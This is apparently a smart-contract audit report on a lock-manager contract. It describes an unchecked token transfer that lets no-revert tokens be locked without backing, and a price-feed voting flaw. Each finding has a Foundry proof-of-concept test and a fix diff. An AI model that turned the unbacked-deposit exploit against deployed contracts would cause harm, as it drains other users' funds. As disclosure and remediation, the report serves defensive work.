# Dyad - Findings Report
Prepared by: Roberto Delgado Ferrezuelo

# Table of contents

- [Findings](#findings)
  - [High](#high)  
    - [\[H-1\] No revert tokens allow users to lock unbacked funds](#h-1-no-revert-tokens-allow-users-to-lock-unbacked-funds)
  - [Medium](#medium)
    - [\[M-1\] Missing disapproval check in `LockManager.sol::approveUSDPrice` allows simultaneous approval and disapproval of a price proposal](#m-1-missing-disapproval-check-in-lockmanagersolapproveusdprice-allows-simultaneous-approval-and-disapproval-of-a-price-proposal)

# Findings
## High
# [H-1] No revert tokens allow users to lock unbacked funds

## Impact
The `transferFrom` function is used to transfer tokens that are being locked. Within this scope, no-revert tokens are included, which return a boolean set to false if the transaction fails. Since this return value is not checked in `LockManager.sol::lock`, an attacker can send nonexistent funds that are incorrectly accounted for as locked tokens. This vulnerability allows the attacker to subsequently drain the funds of other users.

```javascript
    function _lock(
...
        // Transfer erc tokens
        if (_tokenContract != address(0)) {
            IERC20 token = IERC20(_tokenContract);
@>          token.transferFrom(_tokenOwner, address(this), _quantity);
        }
...
```
## Proof of Concept
For a Poc related to this issue, the [`NoRevert.sol`](https://github.com/d-xo/weird-erc20/blob/main/src/NoRevert.sol) contract example found in Github is used. Deploy the contract in the current test suite in `MunchablesTest.sol` and configure it similarly to USDB, ETH and WETH. Once this is done you can run the following function:

```javascript
function test_userDepositsUnbackedTokens() public {
        deployContracts();
        MunchablesCommonLib.Realm realm = MunchablesCommonLib.Realm.Everfrost;
        amp.register(realm, address(0));
        norevert.approve(address(lm), 200 ether);
        lm.lock(address(norevert), 100 ether);

        address attacker = makeAddr("attacker");

        vm.startPrank(attacker);
        amp.register(realm, address(0));
        norevert.approve(address(lm), 200 ether);
        uint256 balanceAttackerBefore = norevert.balanceOf(attacker);
        lm.lock(address(norevert), 100 ether);

        vm.warp(block.timestamp + 1 days + 1);
        lm.unlock(address(norevert), 100 ether);
        assertEq(balanceAttackerBefore, 0);
        assertEq(norevert.balanceOf(attacker), 100 ether);
    }
```

## Tools Used
Manual review.

## Recommended Mitigation Steps
Use SafeERC20 library from OppenZeppelin in `LockManager.sol::lock`:

```diff
...
if (_tokenContract != address(0)) {
            IERC20 token = IERC20(_tokenContract);
-           token.transferFrom(_tokenOwner, address(this), _quantity);
+           token.safeTransferFrom(_tokenOwner, address(this), _quantity);
        }
...
```

## Medium

# [M-1] Missing disapproval check in `LockManager.sol::approveUSDPrice` allows simultaneous approval and disapproval of a price proposal

## Impact
Due to the missing disapproval check, a price feed can both disapprove and subsequently approve a newly proposed price. Price feeds are intended to vote either for approval or disapproval, not both. Hence, this can be considered an unintended functionality.

## Proof of Concept
<details>
<summary>Code</summary>

Place this in `MunchablesTest.sol`.

```javascript
    function test_priceFeedCanVoteBoth() public {
        address priceFeed2 = makeAddr("priceFeed2");
        address tokenUpdated = makeAddr("token");

        address[] memory tokensUpdated = new address[](1);
        tokensUpdated[0] = tokenUpdated;

        deployContracts();

        console.log("--------------- PoC ---------------");

        cs.setRole(Role.PriceFeed_1, address(lm), address(this));
        cs.setRole(Role.PriceFeed_2, address(lm), priceFeed2);

        lm.proposeUSDPrice(1 ether, tokensUpdated);

        vm.startPrank(priceFeed2);
        lm.disapproveUSDPrice(1 ether);
        lm.approveUSDPrice(1 ether);
        vm.stopPrank();
    }
```

</details>

## Tools Used
Manual review.

## Recommended Mitigation Steps
Add a check to see if the price feed has already disapproved the price proposal. If so, revert with a custom error.

```diff
    function approveUSDPrice(
        uint256 _price
    )
        external
        onlyOneOfRoles(
            [
                Role.PriceFeed_1,
                Role.PriceFeed_2,
                Role.PriceFeed_3,
                Role.PriceFeed_4,
                Role.PriceFeed_5
            ]
        )
    {
        if (usdUpdateProposal.proposer == address(0)) revert NoProposalError();
        if (usdUpdateProposal.proposer == msg.sender)
            revert ProposerCannotApproveError();
        if (usdUpdateProposal.approvals[msg.sender] == _usdProposalId)
            revert ProposalAlreadyApprovedError();
+       if (usdUpdateProposal.disapprovals[msg.sender] == _usdProposalId)
+           revert ProposalAlreadyDisapprovedError();
        if (usdUpdateProposal.proposedPrice != _price)
            revert ProposalPriceNotMatchedError();

        usdUpdateProposal.approvals[msg.sender] = _usdProposalId;
        usdUpdateProposal.approvalsCount++;

        if (usdUpdateProposal.approvalsCount >= APPROVE_THRESHOLD) {
            _execUSDPriceUpdate();
        }

        emit ApprovedUSDPrice(msg.sender);
    }

```
